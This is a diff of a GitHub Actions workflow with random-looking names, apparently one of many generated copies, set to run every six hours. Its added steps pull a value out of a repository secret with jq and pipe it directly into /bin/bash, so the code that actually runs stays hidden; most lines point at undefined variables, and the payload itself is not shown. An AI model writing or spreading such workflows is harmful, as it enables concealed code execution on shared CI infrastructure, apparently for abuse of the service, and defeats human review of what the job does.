@@ -1,25 +1,35 @@
 name: jiatingqian7584
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 0/6 * * *'
+    - cron: '22 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiatingqian7584
         env:
-          e87948: ${{ secrets.e87948 }}
+          yph03: ${{ secrets.yph03 }}
         run: |
-          echo $e87948 | jq -r .qz3 | /bin/bash
-          echo $vhd7 | jq -r .bfpne66249 | /bin/bash
-          echo $ij61150 | jq -r .qroy91860 | /bin/bash
-          echo $h256 | jq -r .rfzf34851 | /bin/bash
-          echo $vuzo0896 | jq -r .wogm2317 | /bin/bash
-          echo $eu3 | jq -r .wuqsl98 | /bin/bash
-          echo $kl36 | jq -r .zqpn98 | /bin/bash
-          echo $vab31 | jq -r .ijwy07 | /bin/bash
-          echo $szbxc572 | jq -r .na334 | /bin/bash
+          echo $yph03 | jq -r .wvcg0 | /bin/bash
+          echo $yiw2634 | jq -r .uemqb16374 | /bin/bash
+          echo $fbr16 | jq -r .kwxv42045 | /bin/bash
+          echo $libou176 | jq -r .xdq9836 | /bin/bash
+          echo $jej012 | jq -r .vdb6656 | /bin/bash
+          echo $ivd77249 | jq -r .q46 | /bin/bash
+          echo $xqnh9543 | jq -r .uik5913 | /bin/bash
+          echo $say09787 | jq -r .d33 | /bin/bash
+          echo $l8 | jq -r .bhkc5075 | /bin/bash
+          echo $gvm5847 | jq -r .evgod886 | /bin/bash
+          echo $hsj78 | jq -r .ygegz1 | /bin/bash
+          echo $nzix89183 | jq -r .xwl2 | /bin/bash
+          echo $wwy1 | jq -r .g4 | /bin/bash
+          echo $fmaic6883 | jq -r .s55 | /bin/bash
+          echo $cxr796 | jq -r .fzco2533 | /bin/bash
+          echo $c8 | jq -r .my997 | /bin/bash
+          echo $bxk584 | jq -r .wr296 | /bin/bash
 
